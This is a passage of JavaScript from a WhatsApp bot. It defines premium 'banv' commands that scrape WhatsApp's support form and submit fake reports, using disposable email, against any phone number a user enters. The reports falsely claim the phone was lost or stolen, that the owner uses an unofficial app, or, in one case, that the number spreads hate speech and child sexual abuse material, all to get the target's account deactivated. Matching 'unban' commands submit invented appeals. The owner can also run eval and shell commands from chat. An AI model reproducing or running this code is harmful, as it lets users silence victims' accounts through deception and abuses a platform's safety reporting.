form.append("country_selector", "INDIA")
form.append("phone_number", xeonnumx)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Perdido/roubado: desative minha conta")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
SenseiOfc.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break
case 'banv1': {
if (!isPremium) return replyprem(mess.premium)
if (!args[0]) return replygc(`Use ${prefix+command} number\nExample ${prefix+command} 916969696969`)
let xeonnumx = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let xeontesx = await SenseiOfc.onWhatsApp(xeonnumx)
if (xeontesx.length == 0) return replygc(`Enter a valid and registered number on WhatsApp!!!`)
let axioss = require("axios")  
let xeonxos = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = xeonxos.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(xeonxos.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDIA")
form.append("phone_number", xeonnumx)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Hello, please deactivate this number, because I have lost my cellphone and someone is using my number, please deactivate my number")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
SenseiOfc.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break
case 'banv2': {
if (!isPremium) return replyprem(mess.premium)
if (!args[0]) return replygc(`Use ${prefix+command} number\nExample ${prefix+command} 916969696969`)
let xeonnumx = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let xeontesx = await SenseiOfc.onWhatsApp(xeonnumx)
if (xeontesx.length == 0) return replygc(`Enter a valid and registered number on WhatsApp!!!`)
let axioss = require("axios")  
let xeonxos = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = xeonxos.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(xeonxos.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDIA")
form.append("phone_number", xeonnumx)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Porfavor, desative o número da minha conta, o chip e os documentos foram roubados essa conta possuí dados importante, então, por favor desative minha conta")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
SenseiOfc.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break
case 'banv3': {
if (!isPremium) return replyprem(mess.premium)
if (!args[0]) return replygc(`Use ${prefix+command} number\nExample ${prefix+command} 916969696969`)
let xeonnumx = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let xeontesx = await SenseiOfc.onWhatsApp(xeonnumx)
if (xeontesx.length == 0) return replygc(`Enter a valid and registered number on WhatsApp!!!`)
let axioss = require("axios")  
let xeonxos = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = xeonxos.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(xeonxos.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDIA")
form.append("phone_number", xeonnumx)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Perdido/Roubado: Por favor, desative minha conta\n\nOlá, por favor desative este número, pois perdi meu celular e alguém está usando meu número, por favor desative meu número")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
SenseiOfc.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break
case 'banv4': {
if (!isPremium) return replyprem(mess.premium)
if (!args[0]) return replygc(`Use ${prefix+command} number\nExample ${prefix+command} 916969696969`)
let xeonnumx = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let xeontesx = await SenseiOfc.onWhatsApp(xeonnumx)
if (xeontesx.length == 0) return replygc(`Enter a valid and registered number on WhatsApp!!!`)
let axioss = require("axios")  
let xeonxos = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = xeonxos.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(xeonxos.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDIA")
form.append("phone_number", xeonnumx)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "UM DE SEUS USUÁRIOS, ESTA USANDO O APK DO WHATSAPP FEITO POR TERCEIROS E ESTA INDO CONTRA OS TERMOS DE SERVIÇO PEÇO QUE ANALISEM ESSE USUÁRIO")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
SenseiOfc.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break
case 'banv5': {
if (!isPremium) return replyprem(mess.premium)
if (!args[0]) return replygc(`Use ${prefix+command} number\nExample ${prefix+command} 916969696969`)
xeonnumx = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let xeontesx = await SenseiOfc.onWhatsApp(xeonnumx)
if (xeontesx.length == 0) return replygc(`Enter a valid and registered number on WhatsApp!!!`)
let axioss = require("axios")  
let xeonxos = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = xeonxos.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(xeonxos.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDIA")
form.append("phone_number", xeonnumx)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "مرحبًا ، يرجى إلغاء تنشيط هذا الرقم ، لأنني فقدت هاتفي وشخص ما يستخدم رقمي ، يرجى إلغاء تنشيط رقمي")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
SenseiOfc.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break
case 'banv6': {
if (!isPremium) return replyprem(mess.premium)
if (!args[0]) return replygc(`Use ${prefix+command} number\nExample ${prefix+command} 916969696969`)
let xeonnumx = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let xeontesx = await SenseiOfc.onWhatsApp(xeonnumx)
if (xeontesx.length == 0) return replygc(`Enter a valid and registered number on WhatsApp!!!`)
let axioss = require("axios")  
let xeonxos = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = xeonxos.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(xeonxos.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDIA")
form.append("phone_number", xeonnumx)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Esse número vem fazendo discurso ao ódio e divulgado conteúdo de porno infantil Numero")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
SenseiOfc.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break
case 'unbanv1': {
if (!isPremium) return replyprem(mess.premium)
if (!args[0]) return replygc(`Use ${prefix+command} number\nExample ${prefix+command} 916969696969`)
let xeonnumx = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let xeontesx = await SenseiOfc.onWhatsApp(xeonnumx)
if (xeontesx.length == 0) return replygc(`Enter a valid and registered number on WhatsApp!!!`)
let axioss = require("axios")  
let xeonxos = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = xeonxos.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(xeonxos.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDIA")
form.append("phone_number", xeonnumx)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Hello WhatsApp team, recently my WhatsApp number was suddenly blocked and I couldnt log into my account, in my account there is an important group like a school group and I have to read it but the account My WhatsApp is suddenly blocked, please restore my numbers")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
SenseiOfc.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break
case 'unbanv2': {
if (!isPremium) return replyprem(mess.premium)
if (!args[0]) return replygc(`Use ${prefix+command} number\nExample ${prefix+command} 916969696969`)
let xeonnumx = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let xeontesx = await SenseiOfc.onWhatsApp(xeonnumx)
if (xeontesx.length == 0) return replygc(`Enter a valid and registered number on WhatsApp!!!`)
let axioss = require("axios")  
let xeonxos = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = xeonxos.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(xeonxos.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDIA")
form.append("phone_number", xeonnumx)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Equipe, o sistema de vocês baniram meu número por engano. Peço que vocês reativem meu número pois tenho família em outro país e preciso me comunicar com eles")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
SenseiOfc.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break
case 'unbanv3': {
if (!isPremium) return replyprem(mess.premium)
if (!args[0]) return replygc(`Use ${prefix+command} number\nExample ${prefix+command} 916969696969`)
let xeonnumx = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let xeontesx = await SenseiOfc.onWhatsApp(xeonnumx)
if (xeontesx.length == 0) return replygc(`Enter a valid and registered number on WhatsApp!!!`)
let axioss = require("axios")  
let xeonxos = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = xeonxos.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(xeonxos.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDIA")
form.append("phone_number", xeonnumx)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Kepada pihak WhatsApp yang bijak Sana kenapa akun WhatsApp saya terblokir padahal aktifitas WhatsApp messenger saya normal normal saja mohon dibukakan kembali akun WhatsApp saya dengan ini saya cantumkan kode nomor akun WhatsApp messenger saya sekian banyak Terimakasih")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
SenseiOfc.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break
case 'unbanv4': {
if (!isPremium) return replyprem(mess.premium)
if (!args[0]) return replygc(`Use ${prefix+command} number\nExample ${prefix+command} 916969696969`)
let xeonnumx = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let xeontesx = await SenseiOfc.onWhatsApp(xeonnumx)
if (xeontesx.length == 0) return replygc(`Enter a valid and registered number on WhatsApp!!!`)
let axioss = require("axios")  
let xeonxos = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = xeonxos.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(xeonxos.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDIA")
form.append("phone_number", xeonnumx)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "مرحبًا whatsapp ، تم حظر حسابي بشكل دائم أو مؤقت ، يرجى إلغاء حظر حسابي\nالرقم")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
SenseiOfc.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break
case 'unbanv5': {
if (!isPremium) return replyprem(mess.premium)
if (!args[0]) return replygc(`Use ${prefix+command} number\nExample ${prefix+command} 916969696969`)
let xeonnumx = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let xeontesx = await SenseiOfc.onWhatsApp(xeonnumx)
if (xeontesx.length == 0) return replygc(`Enter a valid and registered number on WhatsApp!!!`)
let axioss = require("axios")  
let xeonxos = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = xeonxos.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(xeonxos.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDIA")
form.append("phone_number", xeonnumx)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Halo pak, Akun Whatsapp Saya diblokir Saya Maaf Saya Telah Menginstal Aplikasi Pihak Ketiga Secara Tidak Sengaja. Harap Buka Blokir Akun Saya Sesegera Mungkin. Terimakasih")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
SenseiOfc.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break
            
            default:
                if (budy.startsWith('=>')) {
                    if (!TheCreator) return StickOwner()
                    function Return(sul) {
                        sat = JSON.stringify(sul, null, 2)
                        bang = util.format(sat)
                        if (sat == undefined) {
                            bang = util.format(sul)
                        }
                        return replygc(bang)
                    }
                    try {
                        replygc(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
                    } catch (e) {
                        replygc(String(e))
                    }
                }

                if (budy.startsWith('>')) {
                    if (!TheCreator) return StickOwner()
                    try {
                        let evaled = await eval(budy.slice(2))
                        if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
                        await replygc(evaled)
                    } catch (err) {
                        await replygc(String(err))
                    }
                }
                if (budy.startsWith('$')) {
                    if (!TheCreator) return StickOwner()
                    exec(budy.slice(2), (err, stdout) => {
                        if (err) return replygc(err)
                        if (stdout) return replygc(stdout)
                    })
                }
                if (isCmd && budy.toLowerCase() != undefined) {
if (m.chat.endsWith('broadcast')) return
if (m.isBaileys) return
let msgs = global.db.data.database
if (!(budy.toLowerCase() in msgs)) return
SenseiOfc.copyNForward(m.chat, msgs[budy.toLowerCase()], true, {quoted: m})
}
            }
    } catch (err) {
        console.log(util.format(err))
        let e = String(err)
if (e.includes("conflict")) return
if (e.includes("not-authorized")) return
if (e.includes("already-exists")) return
if (e.includes("rate-overlimit")) return
if (e.includes("Connection Closed")) return
if (e.includes("Timed Out")) return
if (e.includes("Value not found")) return
if (e.includes("Socket connection timeout")) return
    }
}
